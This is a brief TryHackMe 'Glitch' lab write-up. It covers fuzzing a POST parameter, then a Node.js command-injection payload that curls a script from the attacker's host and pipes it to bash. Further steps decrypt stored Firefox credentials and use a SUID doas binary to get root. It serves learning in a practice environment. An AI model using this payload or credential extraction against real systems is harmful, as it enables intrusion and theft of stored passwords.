---
title: Glitch
description: 'RCE through POST parameter and privilege escalation through a FireFox profile'
pubDate: 2023-06-24
category: 'tryhackme'
tags: ['firefox decrypt']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/baebc18318f328bf978120cde5328cb0.jpeg'
---

Enum all methods and paths then fuzz the POST parameter.

```
ffuf -c -u 'http://10.10.150.35/api/items?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -X POST -b token=this_is_not_real -fw 55
```

## USER
```
POST /api/items?cmd=require('child_process').exec('curl+10.8.119.137:8000/x.sh|bash')
```

## ROOT

There is a FireFox profile which can contain credentials.
We can extact those with https://github.com/unode/firefox_decrypt.

```bash
python3 ff_decrypt.py .firefox

Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
2

Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

Now we can switch to this user:

```bash
su v0id # <-- love_the_void
```

```bash
find / -perm /4000 2>/dev/null | grep -v /run | grep -v /proc | grep -v /sys
...[snip]...
/usr/local/bin/doas
```

```bash
/usr/local/bin/doas bash # <-- love_the_void
```
